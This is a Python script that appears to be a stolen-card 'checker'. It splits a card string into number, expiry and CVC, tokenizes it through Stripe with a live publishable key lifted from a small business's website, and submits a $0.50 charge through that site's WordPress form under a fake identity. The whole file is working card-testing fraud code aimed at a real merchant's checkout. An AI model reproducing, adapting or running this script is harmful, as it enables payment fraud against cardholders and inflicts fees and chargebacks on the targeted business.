import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+card-element&referrer=https%3A%2F%2Fbeauedupwaterfowl.com&time_on_page=36213&key=pk_live_51MUGqiDUa2TR3tnUB2e0XCbtkucgg0iSEJeGtxXcPL0i7JSdVvqSndWQzFTdeWeQXsWDWly6JiZxLpgW63Ucv89z00sdkHHDqi'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '__stripe_mid': 'b7231f02-fc2b-4fb3-b1c0-37cfdfb59d5a59193a',
	    '__stripe_sid': '8b820c6b-2c73-407f-ad7f-0f3c069e0ecae142cf',
	}
	
	headers = {
	    'authority': 'beauedupwaterfowl.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=b7231f02-fc2b-4fb3-b1c0-37cfdfb59d5a59193a; __stripe_sid=8b820c6b-2c73-407f-ad7f-0f3c069e0ecae142cf',
	    'origin': 'https://beauedupwaterfowl.com',
	    'referer': 'https://beauedupwaterfowl.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1736118867537',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=4&_fluentform_5_fluentformnonce=9c35f762e9&_wp_http_referer=%2F&names_1%5Bfirst_name%5D=Rodam&names_1%5Blast_name%5D=User&email=lajaro6411%40matmayer.com&phone=2085812225&dropdown=Turkey%20Hunting&cpt_selection=675&input_radio=Online&numeric-field_11=1&numeric-field_12=200&custom-payment-amount_2=0.50&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '5',
	}
	
	r2 = requests.post(
	    'https://beauedupwaterfowl.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
